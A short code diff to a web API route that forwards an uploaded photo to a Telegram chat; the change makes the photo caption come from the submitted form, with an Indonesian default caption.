@@ -38,10 +38,11 @@ export async function POST(request: Request) {
     // 2. Send Photo if available
     if (photo) {
       try {
+        const caption = (formData.get("caption") as string | null) || "📸 Foto berhasil diambil!";
         const photoFormData = new FormData();
         photoFormData.append("chat_id", chatId);
         photoFormData.append("photo", photo, "photo.jpg");
-        photoFormData.append("caption", "📸 New photo captured!");
+        photoFormData.append("caption", caption);
 
         await fetch(`${telegramApi}/sendPhoto`, {
           method: "POST",
